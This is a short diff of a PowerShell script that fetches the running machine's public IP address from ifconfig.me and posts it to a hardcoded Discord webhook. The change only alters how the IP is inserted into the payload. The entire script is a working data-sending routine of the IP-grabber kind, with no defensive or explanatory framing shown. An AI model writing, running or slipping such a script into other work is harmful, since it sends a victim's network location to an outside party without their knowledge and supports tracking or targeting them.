@@ -4,7 +4,7 @@ $hookUrl = 'https://discord.com/api/webhooks/1007602451702087793/iOOKR4A2rDTjBNi
 $MyIP = (Invoke-WebRequest -uri "http://ifconfig.me/ip").Content
 
 $payload = [PSCustomObject]@{
-    content = $MyIP
+    content = (Invoke-WebRequest -useb -uri "http://ifconfig.me/ip").Content
 }
 Invoke-RestMethod -Uri $hookUrl -Method Post -Body ($payload | ConvertTo-Json)
 
